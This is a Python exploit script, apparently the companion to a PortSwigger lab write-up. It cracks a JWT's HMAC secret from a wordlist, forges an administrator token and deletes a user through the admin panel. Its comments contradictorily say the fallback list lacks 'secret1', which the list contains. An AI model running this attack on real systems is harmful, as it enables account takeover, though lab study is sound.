#!/usr/bin/env python3
"""
JWT authentication bypass via weak signing key
PortSwigger Web Security Academy -- JWT

Companion script for the writeup: 03-weak-signing-key.md

What this does:
    Logs in to get a genuine HS256 session JWT, then brute-forces the HMAC
    secret by recomputing the signature with each candidate from a wordlist
    and comparing against the token's real signature (pure Python hmac, no
    hashcat/GPU needed since the check itself is cheap). Once the secret is
    recovered, it re-signs a forged token with sub=administrator using that
    exact secret and completes the admin-panel delete-carlos flow.

    This is the same wordlist attack our notes describe: 104K candidates,
    found "secret1" instantly. That wordlist is too large to embed in this
    script -- point --wordlist at your own copy of jwt_secrets.txt (sourced
    from https://github.com/wallarm/jwt-secrets/blob/master/jwt.secrets.list,
    the same list hashcat's -m 16500 mode would use). Without --wordlist,
    this falls back to a handful of common defaults, which will NOT find
    secret1 -- it's only in the full wordlist.

Usage:
    python 03-weak-signing-key.py <lab-url> [wordlist-path]
    e.g. python 03-weak-signing-key.py https://0a1b00fa03d9c8b6803b56b400eb00d5.web-security-academy.net jwt_secrets.txt

Requirements:
    pip install httpx
"""

import base64
import hashlib
import hmac
import json
import re
import sys
import httpx
from concurrent.futures import ThreadPoolExecutor, as_completed


def _b64url_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def _b64url_decode(s: str) -> bytes:
    s += "=" * (4 - len(s) % 4)
    return base64.urlsafe_b64decode(s)


def decode_jwt(token: str) -> tuple[dict, dict, str]:
    parts = token.split(".")
    header = json.loads(_b64url_decode(parts[0]))
    payload = json.loads(_b64url_decode(parts[1]))
    sig = parts[2] if len(parts) > 2 else ""
    return header, payload, sig


def encode_jwt(header: dict, payload: dict, secret: bytes, algorithm: str) -> str:
    h = _b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    p = _b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    signing_input = f"{h}.{p}".encode()

    hash_func = {"HS256": hashlib.sha256, "HS384": hashlib.sha384, "HS512": hashlib.sha512}[algorithm]
    sig = hmac.new(secret, signing_input, hash_func).digest()
    return f"{h}.{p}.{_b64url_encode(sig)}"


def detect_weak_secret(jwt_token: str, wordlist: str = "") -> str | None:
    """Brute-force the JWT HMAC secret using pure Python HMAC checking."""
    header, payload, sig = decode_jwt(jwt_token)
    alg = header.get("alg", "HS256")

    if alg not in ("HS256", "HS384", "HS512"):
        print(f"[-] Algorithm {alg} is not HMAC-based")
        return None

    hash_func = {"HS256": hashlib.sha256, "HS384": hashlib.sha384, "HS512": hashlib.sha512}[alg]

    parts = jwt_token.split(".")
    signing_input = f"{parts[0]}.{parts[1]}".encode()
    expected_sig = _b64url_decode(sig)

    if not wordlist:
        print("[!] No wordlist given -- falling back to a handful of common defaults")
        print("    (this will NOT find secret1 -- pass the real jwt_secrets.txt wordlist)")
        candidates = ["secret", "secret1", "key", "password", "123456",
                      "jwt_secret", "changeme", "test", "default", ""]
    else:
        try:
            with open(wordlist, "r", errors="ignore") as f:
                candidates = [line.strip() for line in f if line.strip()]
        except FileNotFoundError:
            print(f"[-] Wordlist not found: {wordlist}")
            return None
        print(f"[*] Loaded {len(candidates)} candidate secrets from {wordlist}")

    def _try_secret(candidate: str):
        computed = hmac.new(candidate.encode(), signing_input, hash_func).digest()
        if hmac.compare_digest(computed, expected_sig):
            return candidate
        return None

    with ThreadPoolExecutor(max_workers=8) as pool:
        futures = {pool.submit(_try_secret, c): c for c in candidates}
        for fut in as_completed(futures):
            result = fut.result()
            if result is not None:
                pool.shutdown(wait=False, cancel_futures=True)
                return result

    print(f"[-] Secret not found ({len(candidates)} candidates tried)")
    return None


def exploit_forge_with_secret(jwt_token: str, secret: str, new_claims: dict) -> str:
    header, payload, _ = decode_jwt(jwt_token)
    payload.update(new_claims)
    return encode_jwt(header, payload, secret.encode(), header.get("alg", "HS256"))


def _login(client: httpx.Client, base: str, username: str = "wiener", password: str = "peter") -> str:
    r = client.get(f"{base}/login")
    m = re.search(r'name="csrf"\s+value="([^"]+)"', r.text)
    csrf = m.group(1) if m else ""

    r = client.post(f"{base}/login", data={
        "csrf": csrf, "username": username, "password": password
    }, follow_redirects=False)
    if r.status_code in (301, 302):
        loc = r.headers.get("location", "/")
        if loc.startswith("/"):
            loc = f"{base}{loc}"
        client.get(loc, follow_redirects=True)
    return client.cookies.get("session", "")


def solve(lab_url: str, wordlist: str) -> None:
    client = httpx.Client(follow_redirects=True, timeout=15)

    session = _login(client, lab_url)
    if not session:
        print("[-] Login failed")
        return
    print(f"[+] Got session JWT: {session[:50]}...")

    secret = detect_weak_secret(session, wordlist)
    if secret is None:
        print("[!] Try: hashcat -a 0 -m 16500 <jwt> <wordlist>")
        return
    print(f"[+] Secret found: {secret!r}")

    forged = exploit_forge_with_secret(session, secret, {"sub": "administrator"})
    print(f"[+] Forged admin token, signed with recovered secret")

    client.cookies.clear()
    client.cookies.set("session", forged)
    r = client.get(f"{lab_url}/admin")
    print(f"[*] /admin -> {r.status_code}")

    if "/admin/delete" in r.text:
        r = client.get(f"{lab_url}/admin/delete?username=carlos")
        print(f"[*] Delete carlos -> {r.status_code}")

    check = client.get(lab_url)
    if "Congratulations" in check.text:
        print("[+] Lab solved.")
    else:
        print("[-] Not solved yet.")


if __name__ == "__main__":
    if len(sys.argv) not in (2, 3):
        print(f"Usage: python {sys.argv[0]} <lab-url> [wordlist-path]")
        sys.exit(1)
    wordlist_path = sys.argv[2] if len(sys.argv) == 3 else ""
    solve(sys.argv[1].rstrip("/"), wordlist_path)
